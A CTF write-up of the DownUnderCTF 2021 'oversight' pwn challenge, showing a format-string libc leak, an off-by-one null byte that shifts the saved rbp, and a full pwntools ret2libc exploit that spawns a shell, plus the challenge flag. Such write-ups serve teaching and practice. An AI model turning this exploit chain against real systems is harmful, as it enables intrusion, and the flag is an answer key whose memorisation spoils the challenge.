---
title: "[writeup][DownUnderCTF 2021] pwn oversight"
date: 2021-10-09 13:00:57
tags:
    - writeup
    - ctf
    - ductf
    - pwn
    - ret2libc
categories:
    - CTF
---

## Intro

this a typical ret2libc problem using rop chain.

require reveal the base point for libc, find offset and setup ropchain

<!-- more -->

## Mitigations

```
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
```

## Solution

### vuln 1

in the `sym.wait()`, the prinf in the will give a format of `"%val$llx"`, where val can be input by by users.

Therefore, we got a way to leak address in the stack (see [here](/2021/10/09/ductf2021-pwn-leaking-like-a-sieve/) if your don't why), which could help to find the **libc** base address

```
void wait(void)
{
	// ignored
    printf("Pick a number: ");
    fgets(&var_85h, 5, _stdin);
    uVar1 = strtol(&var_85h, 0, 10);
    snprintf((int64_t)&var_85h + 5, 100, "Your magic number is: %%%d$llx\n", uVar1)
    // ignored
}
```

### vuln 2

in the `sym.echo_inner`, we can write max 256(0x100) byte to a 256 byte long char pointer. 

however, the `fread` will set next byte to zero. 

in this case, since the char pointer is locate at `sym.echo` and the stack for sym.echo is 0x100 long, the next byte will appear in the save rbp

since saved rbp is little, the last byte of saved rbp will set to zero, which means the rbp for `sym.echo` will decrease/move up some position

for example,

if the origin rbp of `sym.echo` is `0x1010` after `fread`, it will become `0x1000`, which decrease by 0x10.

moreover, the stack above origin rbp is the char array that we can control. by using `fread`, we can easily construct a stack that do what ever we want.


```
0x000012a5      488b0dd42d00.  mov rcx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5 ; [0x4080:8]=0 ; FILE *stream
0x000012ac      e88ffdffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
0x000012b1      488d3d5c0d00.  lea rdi, str.You_said:      ; 0x2014 ; "You said:" ; const char *s
0x000012b8      4898           cdqe
0x000012ba      41c6040400     mov byte [r12 + rax], 0
```
### leak libc

check the stack after printf, we can use 5+12 = 17 to leak `stdout` address.

```
0x7ffe89512620 0x0000000000000d68   h....... @ rsp 3432
0x7ffe89512628 0x00000a373183bad1   ...17...
0x7ffe89512630 0x67616d2072756f59   Your mag @ r12 ascii ('Y')
0x7ffe89512638 0x65626d756e206369   ic numbe ascii ('i')
0x7ffe89512640 0x3125203a73692072   r is: %1 ascii ('r')
0x7ffe89512648 0x00000a786c6c2437   7$llx...
0x7ffe89512650 0x000055c13fc96070   p`.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .bss section..bss,reloc.stdout reloc.__cxa_finalize program R W 0x7fbcb29946a0
0x7ffe89512658 0x00007fbcb29954a0   .T...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0x0
0x7ffe89512660 ..[ null bytes ]..   00000000
0x7ffe89512668 0x00007fbcb283c013   ........ /usr/lib/x86_64-linux-gnu/libc-2.31.so library R X 'cmp eax, 0xffffffff' 'libc-2.31.so'
0x7ffe89512670 0x0000000000000010   ........ 16
0x7ffe89512678 0x00007fbcb29946a0   .F...... /usr/lib/x86_64-linux-gnu/libc-2.31.so library R W 0xfbad2887
0x7ffe89512680 0x000055c13fc94075   u@.?.U.. /home/aynakeya/ctf/ducctf/pwn100-oversight/oversight .rodata str.Lets_play_a_game program R 0x616c70207374654c Lets play a game
```

### construct stack

last 00 are required for alignment

```
@ rsp
ret;
. (new rbp may land here)
. many ret;
. (or here)
ret;
pop rdi; ret;
pointer of "/bin/sh"
call system
00
@ origin rbp

```

## Exploits

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=pwn-2021.duc.tf' '--port=31909' oversight
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('oversight')
libc = ELF("libc-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31909)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
def get_pointer(address:int):
    return address.to_bytes(0x8,"little")
print(io.recv())
io.send(b"\n")
print(123)
io.sendlineafter(b"Pick a number: ",str(5+12).encode())
io.recvuntil(b"Your magic number is: ")
data = io.recv()
print(data)
libc_stdout_address = int(data.decode().split("\n")[0],16)
print(libc_stdout_address)
libc_base = libc_stdout_address - 0x003ec760
libc_pop_rdi = libc_base + 0x215bf
libc_ret = libc_base + 0x08aa
libc_bin_sh = libc_base + 0x001b3e1a
libc_system = libc_base + 0x4f550
mystack =  get_pointer(libc_pop_rdi) + get_pointer(libc_bin_sh) + get_pointer(libc_system) + get_pointer(0)
payload = get_pointer(libc_ret)*(256 // 8 -len(mystack) // 8)+mystack
print("len of payload %d" % (len(payload) / 8))
io.sendline(b"256")
io.sendline(payload)
io.recv()
print("recved")
io.interactive()

```

## flag

DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}